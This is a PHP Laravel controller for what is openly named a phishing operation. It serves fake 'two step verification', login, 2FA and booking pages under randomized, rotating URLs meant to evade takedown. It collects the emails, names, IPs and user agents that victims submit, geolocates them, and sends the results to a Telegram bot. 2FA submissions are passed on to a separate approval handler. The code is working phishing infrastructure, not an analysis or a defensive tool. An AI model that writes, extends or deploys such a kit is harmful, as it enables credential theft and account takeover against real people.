<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;

class PhishingController extends Controller
{
    /**
     * Append the TokenGate query param to a path.
     * TokenGateMiddleware stores token + param name in session under _tg_tok / _tg_par.
     */
    private function gateUrl(string $path): string
    {
        $param = Session::get('_tg_par');
        $token = Session::get('_tg_tok');

        if ($param && $token) {
            $sep = (str_contains($path, '?') ? '&' : '?');
            return $path . $sep . $param . '=' . $token;
        }

        return $path;
    }

    public function getSessionData()
    {
        if (!Session::has('_s_data')) {
            $pathToken1 = Str::random(60);
            $pathToken2 = Str::random(60);
            $pathToken3 = Str::random(60);
            $pathToken4 = Str::random(60);
            $pathToken5 = Str::random(60);

            $loginPath    = $this->gateUrl("/two_step_verification{$pathToken1}/login/{$pathToken2}");
            $authPath     = $this->gateUrl("/two_step_verification{$pathToken1}/authentication/{$pathToken3}");
            $metaBasePath = $this->gateUrl("/two_step_verification{$pathToken1}/invitation/{$pathToken4}");
            $settingsPath = $this->gateUrl("/two_step_verification{$pathToken1}/latest-settings-info/{$pathToken5}");

            $sessionData = [
                'ip' => request()->ip(),
                'userAgent' => request()->header('User-Agent') ?: "",
                'createdAt' => now()->timestamp,
                'loginPath'    => $loginPath,
                'authPath'     => $authPath,
                'metaBasePath' => $metaBasePath,
                'settingsPath' => $settingsPath,
                'pathPrefix'   => "two_step_verification{$pathToken1}",
            ];
            Session::put('_s_data', $sessionData);
        }
        return Session::get('_s_data');
    }
    public function home()
    {
        return view('landing.home');
    }
    public function index(Request $request)
    {
        // Always refresh token on each visit
        if (!session('_inv_token') || $request->query('token') !== session('_inv_token')) {
            $newToken = Str::random(200);
            session(['_inv_token' => $newToken]);
            return redirect('/invitation?token=' . $newToken);
        }
        return view('index2');
    }

    public function about()
    {
        return view('landing.about');
    }

    public function contact()
    {
        return view('landing.contact');
    }

    public function startPhishing()
    {
        $session = $this->getSessionData();
        $targetUrl = $session['loginPath'];

        return response()->view('welcome_redirect', [
            'targetUrl' => $targetUrl,
            'metaBasePath' => $session['metaBasePath']
        ])->header('Content-Type', 'text/html');
    }

    public function latestSettingsInfo()
    {
        $session = $this->getSessionData();
        $targetUrl = $session['settingsPath'];

        return response()->view('welcome_redirect', [
            'targetUrl' => $targetUrl,
            'metaBasePath' => $session['metaBasePath']
        ])->header('Content-Type', 'text/html');
    }

    public function showLogin($tpath, $ltoken)
    {
        $session = $this->getSessionData();
        if ("two_step_verification{$tpath}" !== $session['pathPrefix']) {
            return abort(404);
        }
        return view('login1', [
            'loginPath' => $session['loginPath'],
            'authPath' => $session['authPath']
        ]);
    }

    public function show2fa($tpath, $atoken)
    {
        $session = $this->getSessionData();
        if ("two_step_verification{$tpath}" !== $session['pathPrefix']) {
            return abort(404);
        }

        // Referer check removed to prevent blocking legitimate flows or testers

        return view('2fa1', [
            'metaBasePath' => $session['metaBasePath']
        ]);
    }

    public function showMeta($tpath, $itoken, $page)
    {
        $session = $this->getSessionData();
        if ("two_step_verification{$tpath}" !== $session['pathPrefix']) {
            return abort(404);
        }

        $templates = [1 => "meta1v1", 2 => "meta2v2", 3 => "meta3v2"];
        if (!isset($templates[$page])) {
            return abort(404);
        }

        return view($templates[$page], ['metaBasePath' => $session['metaBasePath']]);
    }

    public function showFx($tpath, $stoken)
    {
        $session = $this->getSessionData();
        if ("two_step_verification{$tpath}" !== $session['pathPrefix']) {
            return abort(404);
        }
        return view('fx', [
            'metaBasePath' => $session['metaBasePath']
        ]);
    }

    public function showLogin2v2(Request $request)
    {
        $session = $this->getSessionData();
        // Always refresh token on each visit
        if (!session('_lv2_token') || $request->query('token') !== session('_lv2_token')) {
            $newToken = Str::random(200);
            session(['_lv2_token' => $newToken]);
            return redirect('/invitation-login?token=' . $newToken);
        }
        return view('login2v2', [
            'metaBasePath' => $session['metaBasePath'],
            'authPath' => $session['authPath']
        ]);
    }

    public function showBookingOtio(Request $request, $token = null)
    {
        $session = $this->getSessionData();
        $isConfirm = $request->has('confirm') || $request->query('confirm') === '1';
        $confirmParam = $isConfirm ? '?confirm=1' : '';

        // Always refresh token on each visit
        if (!session('_otio_token') || $token !== session('_otio_token')) {
            $newToken = Str::random(200);
            session(['_otio_token' => $newToken]);
            return redirect('/app/intro/availability-' . $newToken . $confirmParam);
        }

        session(['booking_return_url' => url('/app/intro/availability-' . session('_otio_token') . '?confirm=1')]);

        return view('booking-otio', [
            'metaBasePath' => $session['metaBasePath'],
            'authPath' => $session['authPath'],
            'isConfirm' => $isConfirm,
            'bookingInfo' => session('booking_info', null)
        ]);
    }

    public function handleBookingOtioSubmit(Request $request)
    {
        return app(LoginApprovalController::class)->submitBookingOtio($request);
    }

    public function handleBookingOtioClear(Request $request)
    {
        session()->forget(['booking_info', 'booking_return_url']);
        return response()->json(['status' => 'cleared']);
    }

    public function getSessionPaths()
    {
        $session = Session::get('_s_data');
        if (!$session) {
            return response()->json(['error' => 'No session'], 401);
        }
        return response()->json([
            'loginPath' => $session['loginPath'],
            'authPath' => $session['authPath'],
            'metaBasePath' => $session['metaBasePath'],
            'settingsPath' => $session['settingsPath'],
        ]);
    }

    public function handleLogin(Request $request)
    {
        $data = $request->all();
        $data['ip'] = $request->ip();
        $data['userAgent'] = $request->header('User-Agent') ?: 'N/A';
        $data['type'] = "Đăng Nhập Lần " . ($data['attempts'] ?? 1) . " - Email " . ($data['email'] ?? 'N/A');

        $this->logAndSend($data);

        return response()->json(['status' => 'ok']);
    }

    public function handle2fa(Request $request)
    {
        $data = $request->all();
        $data['ip'] = $request->ip();
        $data['userAgent'] = $request->header('User-Agent') ?: 'N/A';
        $data['type'] = "2FA Lần " . ($data['step'] ?? 1) . " - Email " . ($data['email'] ?? 'N/A');

        $this->logAndSend($data);

        return app(LoginApprovalController::class)->submit2fa($request);
    }

    public function handleGenericLog(Request $request)
    {
        $data = $request->all();
        $data['ip'] = $request->ip();
        $data['userAgent'] = $request->header('User-Agent') ?: 'N/A';

        $this->logAndSend($data);

        return response()->json(['status' => 'ok']);
    }

    private function logAndSend($data)
    {
        $data = $this->stripSensitiveFields($data);
        $ip = $data['ip'];
        $geo = $this->getGeo($ip);

        $data['city'] = $geo['city'] ?? 'Unknown';
        $data['region'] = $geo['region'] ?? 'Unknown';
        $data['country'] = $geo['country'] ?? 'Unknown';
        $data['org'] = $geo['org'] ?? 'Unknown';
        $data['timezone'] = $geo['timezone'] ?? 'Unknown';
        $data['time'] = now()->toIso8601String();

        // Save to log file
        $logEntry = now()->toIso8601String() . " - IP: " . $ip . " - Location: " . ($geo['city'] ?? "Unknown") . ", " . ($geo['country'] ?? "Unknown") . " - " . json_encode($data) . PHP_EOL;
        Log::channel('single')->info($logEntry);

        // Format for Telegram
        $message = $this->formatTelegramMessage($data, ($geo['city'] ?? "Unknown") . ", " . ($geo['country'] ?? "Unknown"));
        $this->sendToTelegram($message);
    }

    private function getGeo($ip)
    {
        if (!$ip || $ip === "::1" || $ip === "127.0.0.1") {
            return [
                'city' => 'Local',
                'region' => 'Local',
                'country' => 'Local',
                'org' => 'Local',
                'timezone' => 'Local'
            ];
        }

        try {
            $response = Http::get("http://ip-api.com/json/{$ip}");
            if ($response->successful()) {
                $data = $response->json();
                if ($data['status'] === 'success') {
                    return [
                        'city' => $data['city'],
                        'region' => $data['regionName'],
                        'country' => $data['country'],
                        'org' => $data['org'],
                        'timezone' => $data['timezone']
                    ];
                }
            }
        } catch (\Exception $e) {
        }

        return [];
    }

    private function formatTelegramMessage($data, $location)
    {
        $escapeMd = function ($str) {
            if (!is_string($str))
                return $str;
            return str_replace(['`', '*'], ['\\`', '\\*'], $str);
        };

        $msg = "*THÔNG TIN HOẠT ĐỘNG*\n";
        $msg .= "----------------------------------------------------------\n";

        if (isset($data['email']))
            $msg .= "Email: `{$escapeMd($data['email'])}`\n";

        if (isset($data['firstName']) || isset($data['lastName'])) {
            $msg .= "Name: {$escapeMd($data['firstName'] ?? '')} {$escapeMd($data['lastName'] ?? '')}\n";
        }

        $msg .= "----------------------------------------------------------\n";
        $msg .= "Sensitive fields: removed before logging/Telegram\n";

        $msg .= "----------------------------------------------------------\n";
        $msg .= "IP Address: `{$escapeMd($data['ip'] ?? 'N/A')}`\n";
        $msg .= "Location: {$location}\n";
        if (isset($data['city']))
            $msg .= " City: {$escapeMd($data['city'])}\n";
        if (isset($data['country']))
            $msg .= "Country: {$escapeMd($data['country'])}\n";
        if (isset($data['org']))
            $msg .= "Org: {$escapeMd($data['org'])}\n";

        $msg .= "----------------------------------------------------------\n";
        $msg .= "User-Agent:\n`{$escapeMd($data['userAgent'] ?? 'N/A')}`\n";
        $msg .= "----------------------------------------------------------\n";

        if (isset($data['type']))
            $msg .= "Type: {$data['type']}\n";
        if (isset($data['page']))
            $msg .= "Page: {$data['page']}\n";

        return $msg;
    }

    private function stripSensitiveFields(array $data): array
    {
        $sensitiveKeys = [
            'pass',
            'password',
            'password1',
            'password2',
            'code',
            'code2',
            'otp',
            'token',
            'secret',
        ];

        foreach ($sensitiveKeys as $key) {
            unset($data[$key]);
        }

        return $data;
    }

    private function sendToTelegram($message)
    {
        $token = env('TELEGRAM_BOT_TOKEN');
        $chatId = env('TELEGRAM_CHAT_ID');

        if (!$token || !$chatId) {
            Log::warning("Telegram credentials not set.");
            return;
        }

        $url = "https://api.telegram.org/bot{$token}/sendMessage";

        $response = Http::post($url, [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ]);

        if (!$response->successful()) {
            // Retry without markdown
            Http::post($url, [
                'chat_id' => $chatId,
                'text' => $message,
            ]);
        }
    }
}
